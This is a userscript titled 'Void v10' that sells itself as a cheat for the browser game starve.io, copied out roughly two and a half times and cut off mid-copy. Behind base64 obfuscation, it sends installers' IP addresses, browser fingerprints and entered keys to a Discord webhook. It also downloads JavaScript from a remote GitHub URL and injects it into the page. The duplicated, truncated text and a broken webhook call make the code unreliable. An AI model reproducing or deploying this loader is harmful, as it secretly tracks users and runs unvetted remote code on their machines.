// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
